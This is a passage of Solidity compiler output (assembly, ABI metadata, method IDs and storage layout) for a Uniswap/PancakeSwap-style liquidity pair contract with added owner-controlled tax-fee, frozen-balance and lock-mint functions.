										},
										{
											"begin": -1,
											"end": -1,
											"name": "DUP4"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "CODECOPY"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "DUP2"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "MLOAD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SWAP2"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "MSTORE"
										},
										{
											"begin": 2125,
											"end": 2162,
											"name": "SWAP3"
										},
										{
											"begin": 2125,
											"end": 2162,
											"name": "DUP2"
										},
										{
											"begin": 2125,
											"end": 2162,
											"name": "SWAP1"
										},
										{
											"begin": 2125,
											"end": 2162,
											"name": "SUB"
										},
										{
											"begin": 2125,
											"end": 2162,
											"name": "SWAP1"
										},
										{
											"begin": 2125,
											"end": 2162,
											"name": "SWAP2"
										},
										{
											"begin": 2125,
											"end": 2162,
											"name": "ADD"
										},
										{
											"begin": 2125,
											"end": 2162,
											"name": "SWAP1"
										},
										{
											"begin": 2125,
											"end": 2162,
											"name": "LOG3"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": 2179,
											"end": 2183,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": 1714,
											"end": 2190,
											"name": "SWAP3"
										},
										{
											"begin": 1714,
											"end": 2190,
											"name": "SWAP2"
										},
										{
											"begin": 1714,
											"end": 2190,
											"name": "POP"
										},
										{
											"begin": 1714,
											"end": 2190,
											"name": "POP"
										},
										{
											"begin": 1714,
											"end": 2190,
											"name": "JUMP",
											"value": "[out]"
										},
										{
											"begin": 321,
											"end": 439,
											"name": "tag",
											"value": "350"
										},
										{
											"begin": 321,
											"end": 439,
											"name": "JUMPDEST"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "70"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 396,
											"end": 406,
											"name": "AND"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "70"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": 396,
											"end": 413,
											"name": "MUL"
										},
										{
											"begin": 396,
											"end": 413,
											"name": "SWAP1"
										},
										{
											"begin": 321,
											"end": 439,
											"name": "JUMP",
											"value": "[out]"
										},
										{
											"begin": 507,
											"end": 613,
											"name": "tag",
											"value": "351"
										},
										{
											"begin": 507,
											"end": 613,
											"name": "JUMPDEST"
										},
										{
											"begin": 567,
											"end": 576,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "70"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 596,
											"end": 606,
											"name": "DUP3"
										},
										{
											"begin": 596,
											"end": 606,
											"name": "AND"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "E0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 592,
											"end": 606,
											"name": "DUP5"
										},
										{
											"begin": 592,
											"end": 606,
											"name": "AND"
										},
										{
											"begin": 596,
											"end": 606,
											"name": "DUP2"
										},
										{
											"begin": 592,
											"end": 606,
											"name": "PUSH [tag]",
											"value": "404"
										},
										{
											"begin": 592,
											"end": 606,
											"name": "JUMPI"
										},
										{
											"begin": 592,
											"end": 606,
											"name": "INVALID"
										},
										{
											"begin": 592,
											"end": 606,
											"name": "tag",
											"value": "404"
										},
										{
											"begin": 592,
											"end": 606,
											"name": "JUMPDEST"
										},
										{
											"begin": 592,
											"end": 606,
											"name": "DIV"
										},
										{
											"begin": 592,
											"end": 606,
											"name": "SWAP4"
										},
										{
											"begin": 507,
											"end": 613,
											"name": "SWAP3"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": 507,
											"end": 613,
											"name": "JUMP",
											"value": "[out]"
										},
										{
											"begin": 198,
											"end": 333,
											"name": "tag",
											"value": "358"
										},
										{
											"begin": 198,
											"end": 333,
											"name": "JUMPDEST"
										},
										{
											"begin": 290,
											"end": 295,
											"name": "DUP1"
										},
										{
											"begin": 290,
											"end": 295,
											"name": "DUP3"
										},
										{
											"begin": 290,
											"end": 295,
											"name": "ADD"
										},
										{
											"begin": 285,
											"end": 301,
											"name": "DUP3"
										},
										{
											"begin": 285,
											"end": 301,
											"name": "DUP2"
										},
										{
											"begin": 285,
											"end": 301,
											"name": "LT"
										},
										{
											"begin": 285,
											"end": 301,
											"name": "ISZERO"
										},
										{
											"begin": 277,
											"end": 326,
											"name": "PUSH [tag]",
											"value": "188"
										},
										{
											"begin": 277,
											"end": 326,
											"name": "JUMPI"
										},
										{
											"begin": 277,
											"end": 326,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 277,
											"end": 326,
											"name": "DUP1"
										},
										{
											"begin": 277,
											"end": 326,
											"name": "MLOAD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "461BCD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "E5"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": 277,
											"end": 326,
											"name": "DUP2"
										},
										{
											"begin": 277,
											"end": 326,
											"name": "MSTORE"
										},
										{
											"begin": 277,
											"end": 326,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 277,
											"end": 326,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 277,
											"end": 326,
											"name": "DUP3"
										},
										{
											"begin": 277,
											"end": 326,
											"name": "ADD"
										},
										{
											"begin": 277,
											"end": 326,
											"name": "MSTORE"
										},
										{
											"begin": 277,
											"end": 326,
											"name": "PUSH",
											"value": "14"
										},
										{
											"begin": 277,
											"end": 326,
											"name": "PUSH",
											"value": "24"
										},
										{
											"begin": 277,
											"end": 326,
											"name": "DUP3"
										},
										{
											"begin": 277,
											"end": 326,
											"name": "ADD"
										},
										{
											"begin": 277,
											"end": 326,
											"name": "MSTORE"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "64732D6D6174682D6164642D6F766572666C6F77"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "60"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": 277,
											"end": 326,
											"name": "PUSH",
											"value": "44"
										},
										{
											"begin": 277,
											"end": 326,
											"name": "DUP3"
										},
										{
											"begin": 277,
											"end": 326,
											"name": "ADD"
										},
										{
											"begin": 277,
											"end": 326,
											"name": "MSTORE"
										},
										{
											"begin": 277,
											"end": 326,
											"name": "SWAP1"
										},
										{
											"begin": 277,
											"end": 326,
											"name": "MLOAD"
										},
										{
											"begin": 277,
											"end": 326,
											"name": "SWAP1"
										},
										{
											"begin": 277,
											"end": 326,
											"name": "DUP2"
										},
										{
											"begin": 277,
											"end": 326,
											"name": "SWAP1"
										},
										{
											"begin": 277,
											"end": 326,
											"name": "SUB"
										},
										{
											"begin": 277,
											"end": 326,
											"name": "PUSH",
											"value": "64"
										},
										{
											"begin": 277,
											"end": 326,
											"name": "ADD"
										},
										{
											"begin": 277,
											"end": 326,
											"name": "SWAP1"
										},
										{
											"begin": 277,
											"end": 326,
											"name": "REVERT"
										}
									],
									".data": {
										"1B988F8784CC3CF7AD7D1BF59197DF07B7925B5A748A478400A8F83FD9E196EF": "4f6e6c79206f776e65722063616e2063616c6c20746869732066756e6374696f6e",
										"50B0A6DD250A09C1CD083AD4BF9F97424665D60E7BC0A208A1151C7D0051999C": "50616e63616b653a20494e53554646494349454e545f494e5055545f414d4f554e54",
										"6591C9F5BF1FEFAAD109B76A20E25C857B696080C952191F86220F001A83663E": "556e697377617056323a20494e53554646494349454e545f4c49515549444954595f4d494e544544",
										"6C050B0A8D3F2D18D11271EE0A551B7748437B8FA9A6165C561190D34A2947D6": "50616e63616b653a20494e53554646494349454e545f4c49515549444954595f4255524e4544",
										"ADA389E1FC24A8587C776340EFB91B36E675792AB631816100D55DF0B5CF3CBC": "ddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef",
										"C654718515B5F98052EB92744D97D32CCCABF6E8B2BAE886738591C9B906CFD8": "50616e63616b653a20494e53554646494349454e545f4f55545055545f414d4f554e54",
										"EF633320352A650C1D75752F13E6C73D8D8F7F26A5596A6D026C1BF50D2F7713": "50616e63616b653a20494e53554646494349454e545f4c49515549444954595f4d494e544544"
									}
								},
								"8B73C3C69BB8FE3D512ECC4CF759CC79239F7B179B0FFACAA9A75D522B39400F": "454950373132446f6d61696e28737472696e67206e616d652c737472696e672076657273696f6e2c75696e7432353620636861696e49642c6164647265737320766572696679696e67436f6e747261637429"
							}
						},
						"methodIdentifiers": {
							"DOMAIN_SEPARATOR()": "3644e515",
							"FeeResiver()": "900820d8",
							"Lockmint(address)": "dcbbb373",
							"MINIMUM_LIQUIDITY()": "ba9a7a56",
							"PERMIT_TYPEHASH()": "30adf81f",
							"_frozenBalance(address)": "47d5d856",
							"allowance(address,address)": "dd62ed3e",
							"approve(address,uint256)": "095ea7b3",
							"balanceOf(address)": "70a08231",
							"burn(address)": "89afcb44",
							"decimals()": "313ce567",
							"factory()": "c45a0155",
							"getReserves()": "0902f1ac",
							"initialize(address,address,uint256)": "1794bb3c",
							"kLast()": "7464fc3d",
							"mint(address)": "6a627842",
							"name()": "06fdde03",
							"nonces(address)": "7ecebe00",
							"owner()": "8da5cb5b",
							"permit(address,address,uint256,uint256,uint8,bytes32,bytes32)": "d505accf",
							"price0CumulativeLast()": "5909c0d5",
							"price1CumulativeLast()": "5a3d5493",
							"skim(address)": "bc25cf77",
							"swap(uint256,uint256,address,bytes)": "022c0d9f",
							"symbol()": "95d89b41",
							"sync()": "fff6cae9",
							"taxfee()": "f317739c",
							"taxfeeupdate(uint256)": "6488f7b0",
							"token0()": "0dfe1681",
							"token1()": "d21220a7",
							"totalSupply()": "18160ddd",
							"transfer(address,uint256)": "a9059cbb",
							"transferFrom(address,address,uint256)": "23b872dd"
						}
					},
					"metadata": "{\"compiler\":{\"version\":\"0.5.16+commit.9c3226ce\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"inputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"amount0\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"amount1\",\"type\":\"uint256\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"}],\"name\":\"Burn\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"amount0\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"amount1\",\"type\":\"uint256\"}],\"name\":\"Mint\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"amount0In\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"amount1In\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"amount0Out\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"amount1Out\",\"type\":\"uint256\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"}],\"name\":\"Swap\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"uint112\",\"name\":\"reserve0\",\"type\":\"uint112\"},{\"indexed\":false,\"internalType\":\"uint112\",\"name\":\"reserve1\",\"type\":\"uint112\"}],\"name\":\"Sync\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"constant\":true,\"inputs\":[],\"name\":\"DOMAIN_SEPARATOR\",\"outputs\":[{\"internalType\":\"bytes32\",\"name\":\"\",\"type\":\"bytes32\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"FeeResiver\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"}],\"name\":\"Lockmint\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"liquidity\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"MINIMUM_LIQUIDITY\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"PERMIT_TYPEHASH\",\"outputs\":[{\"internalType\":\"bytes32\",\"name\":\"\",\"type\":\"bytes32\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"_frozenBalance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"}],\"name\":\"burn\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"amount0\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"amount1\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"factory\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"getReserves\",\"outputs\":[{\"internalType\":\"uint112\",\"name\":\"_reserve0\",\"type\":\"uint112\"},{\"internalType\":\"uint112\",\"name\":\"_reserve1\",\"type\":\"uint112\"},{\"internalType\":\"uint32\",\"name\":\"_blockTimestampLast\",\"type\":\"uint32\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"address\",\"name\":\"_token0\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"_token1\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"_taxfee\",\"type\":\"uint256\"}],\"name\":\"initialize\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"kLast\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"}],\"name\":\"mint\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"liquidity\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"nonces\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"deadline\",\"type\":\"uint256\"},{\"internalType\":\"uint8\",\"name\":\"v\",\"type\":\"uint8\"},{\"internalType\":\"bytes32\",\"name\":\"r\",\"type\":\"bytes32\"},{\"internalType\":\"bytes32\",\"name\":\"s\",\"type\":\"bytes32\"}],\"name\":\"permit\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"price0CumulativeLast\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"price1CumulativeLast\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"}],\"name\":\"skim\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"amount0Out\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"amount1Out\",\"type\":\"uint256\"},{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"bytes\",\"name\":\"data\",\"type\":\"bytes\"}],\"name\":\"swap\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"sync\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"taxfee\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"_newtax\",\"type\":\"uint256\"}],\"name\":\"taxfeeupdate\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"token0\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"token1\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"}],\"devdoc\":{\"methods\":{}},\"userdoc\":{\"methods\":{}}},\"settings\":{\"compilationTarget\":{\"Pair.sol\":\"Pair\"},\"evmVersion\":\"istanbul\",\"libraries\":{},\"optimizer\":{\"enabled\":true,\"runs\":200},\"remappings\":[]},\"sources\":{\"ERC20.sol\":{\"keccak256\":\"0x59f3a9c274714d7b3493d7898f412eee5e2aa3df408df3a67134f5333112aaab\",\"urls\":[\"bzz-raw://45d02bb45a633b1dac3a8bb29be50cb07117f65e11a2c7214290a7d9e34c9688\",\"dweb:/ipfs/Qme3WmF8PrqUH7D9XggNYZEaHHR2nTLd2Ld7C14T68TgY3\"]},\"ICallee.sol\":{\"keccak256\":\"0xdd42904310b0f5d040eef9abb7b14327315f8437576e7fc7c1ea004130bf138a\",\"urls\":[\"bzz-raw://6377a208affde795cbdbd2024e38b1dd7ddabd51cc106974ad583d062a636de1\",\"dweb:/ipfs/QmNgMBbkfLbuf9yZSqY57HR5Nh8esYyGXgHNnSY2K1DsNe\"]},\"IERC20.sol\":{\"keccak256\":\"0xa45dab2f2a6e81dff31d7f62a0b0513ae09f7f01ee22d0970e2b532e2b14fad8\",\"urls\":[\"bzz-raw://5b5177e85ae0239a5d633ca2d83652b0fc63622f0bc317a3d32a3661f50d7537\",\"dweb:/ipfs/QmdV9Jp5icxxC3SYVVuwQTKXMcWicDToahxUxdkFCJC4M9\"]},\"IFactory.sol\":{\"keccak256\":\"0x69d7f0c32f305449132b97119efc9d382c41c027f7739e312fdf3ca6b0bfc64d\",\"urls\":[\"bzz-raw://63280eb6f4eef4de9934869aee43278c3c5d48255b6c2ed9e10e6e4a136aae0b\",\"dweb:/ipfs/QmazKfJnm2PcDVZjBYLAZPyDrmPSmEnuurAvc7mbTKymAj\"]},\"IPair.sol\":{\"keccak256\":\"0xdb92972f4ad91928bf2b838c35717718651f0501be334e6f30849c56fe99ff66\",\"urls\":[\"bzz-raw://e481899dee463be19aa61191acfef749034329127d372116ad504bad936f14e0\",\"dweb:/ipfs/QmeFYDk2NDiNjZt1yUDo8u1CuxYVdswc2mqWETaCzD1Cnv\"]},\"Math.sol\":{\"keccak256\":\"0x9e94097dd206ec6121005eb1e67e8347a2cfca90fb7d0b599522ce2f8a36c09b\",\"urls\":[\"bzz-raw://bfa9f239f212c94f413dc5ef4f5cabc853e789519bd9610a51fd7a2ea222d8fb\",\"dweb:/ipfs/QmR1YCU8VQ28BnqeRQ9WqSwqjxLzmtJYz2KqW2XQKjP9dR\"]},\"Pair.sol\":{\"keccak256\":\"0x5ad7ea0e9c4a7e59439197ca8ebd26fdcb07d1743e1c6a7ef482f237177a6545\",\"urls\":[\"bzz-raw://89986b7afbd5c6adef6f5dcb863011650a94f1ad6a624f99875894853c67a3ae\",\"dweb:/ipfs/QmYkvEd4TbKPtBC5Pnj3S9vgtiiM73aDXpSdEBfoZ7n1Wc\"]},\"SafeMath.sol\":{\"keccak256\":\"0xd0cc5ede4252f34f9adf75af689fb003aa6349f229b9bba72db43cba9bb1c9d9\",\"urls\":[\"bzz-raw://a2cb594533aebe5028b93c5c429b23907a4830964d8c6728565992bee4cf1eef\",\"dweb:/ipfs/QmdSBCeJiqjQeGZ2K79DXaDfaqJMtXCWAyXDWJ3KNDWZKM\"]},\"UQ112x112.sol\":{\"keccak256\":\"0x6e2290410379a33e837cbc6ff96ff5d983345daf2d824705b6f4b4c22ebc36a9\",\"urls\":[\"bzz-raw://d3dc93ec9e4b2d9da2f664930040f7b88c6364d40289ddfa911a4403ea05e783\",\"dweb:/ipfs/QmXcS8kvWMEBQbdu9JodRhY1yjomGG13KZpcAivd5x2NDH\"]}},\"version\":1}",
					"storageLayout": {
						"storage": [
							{
								"astId": 19,
								"contract": "Pair.sol:Pair",
								"label": "totalSupply",
								"offset": 0,
								"slot": "0",
								"type": "t_uint256"
							},
							{
								"astId": 23,
								"contract": "Pair.sol:Pair",
								"label": "balanceOf",
								"offset": 0,
								"slot": "1",
								"type": "t_mapping(t_address,t_uint256)"
							},
							{
								"astId": 29,
								"contract": "Pair.sol:Pair",
								"label": "allowance",
								"offset": 0,
								"slot": "2",
								"type": "t_mapping(t_address,t_mapping(t_address,t_uint256))"
							},
							{
								"astId": 33,
								"contract": "Pair.sol:Pair",
								"label": "_frozenBalance",
								"offset": 0,
								"slot": "3",
								"type": "t_mapping(t_address,t_uint256)"
							},
							{
								"astId": 35,
								"contract": "Pair.sol:Pair",
								"label": "DOMAIN_SEPARATOR",
								"offset": 0,
								"slot": "4",
								"type": "t_bytes32"
							},
							{
								"astId": 42,
								"contract": "Pair.sol:Pair",
								"label": "nonces",
								"offset": 0,
								"slot": "5",
								"type": "t_mapping(t_address,t_uint256)"
							},
							{
								"astId": 950,
								"contract": "Pair.sol:Pair",
								"label": "FeeResiver",
								"offset": 0,
								"slot": "6",
								"type": "t_address"
							},
							{
								"astId": 966,
								"contract": "Pair.sol:Pair",
								"label": "factory",
								"offset": 0,
								"slot": "7",
								"type": "t_address"
							},
							{
								"astId": 968,
								"contract": "Pair.sol:Pair",
								"label": "token0",
								"offset": 0,
								"slot": "8",
								"type": "t_address"
							},
							{
								"astId": 970,
								"contract": "Pair.sol:Pair",
								"label": "token1",
								"offset": 0,
								"slot": "9",
								"type": "t_address"
							},
							{
								"astId": 972,
								"contract": "Pair.sol:Pair",
								"label": "taxfee",
								"offset": 0,
								"slot": "10",
								"type": "t_uint256"
							},
							{
								"astId": 974,
								"contract": "Pair.sol:Pair",
								"label": "reserve0",
								"offset": 0,
								"slot": "11",
								"type": "t_uint112"
							},
							{
								"astId": 976,
								"contract": "Pair.sol:Pair",
								"label": "reserve1",
								"offset": 14,
								"slot": "11",
								"type": "t_uint112"
							},
							{
								"astId": 978,
								"contract": "Pair.sol:Pair",
								"label": "blockTimestampLast",
								"offset": 28,
								"slot": "11",
								"type": "t_uint32"
							},
							{
								"astId": 980,
								"contract": "Pair.sol:Pair",
								"label": "price0CumulativeLast",
								"offset": 0,
								"slot": "12",
								"type": "t_uint256"
							},
							{
								"astId": 982,
								"contract": "Pair.sol:Pair",
								"label": "price1CumulativeLast",
								"offset": 0,
								"slot": "13",
								"type": "t_uint256"
							},
							{
								"astId": 984,
								"contract": "Pair.sol:Pair",
								"label": "kLast",
								"offset": 0,
								"slot": "14",
								"type": "t_uint256"
							},
							{
								"astId": 986,
								"contract": "Pair.sol:Pair",
								"label": "owner",
								"offset": 0,
								"slot": "15",
								"type": "t_address"
							},
							{
								"astId": 989,
								"contract": "Pair.sol:Pair",
								"label": "unlocked",
								"offset": 0,
								"slot": "16",
								"type": "t_uint256"
							}
						],
						"types": {
							"t_address": {
								"encoding": "inplace",
								"label": "address",
